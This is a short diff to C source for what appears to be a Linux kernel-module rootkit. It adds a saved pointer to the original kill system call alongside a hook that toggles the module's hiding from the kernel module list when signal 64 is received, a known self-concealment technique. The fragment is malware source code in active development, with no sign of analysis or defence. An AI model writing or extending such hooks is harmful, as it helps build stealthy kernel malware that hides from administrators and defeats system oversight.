@@ -3,9 +3,11 @@ static struct list_head *priorModule;
 static short isHidden = 0;
 
 #ifdef PTREGS_SYSCALL_STUBS
+asmlinkage long (*killOG)(const struct pt_regs *);
 asmlinkage int killHook(const struct pt_regs *regs) {
     int sig = regs->si;
 #else
+asmlinkage long (*killOG)(pid_t pid, int sig);
 asmlinkage int killHook(pid_t pid, int sig) { 
 #endif
     if (sig == 64) toggleHiding();
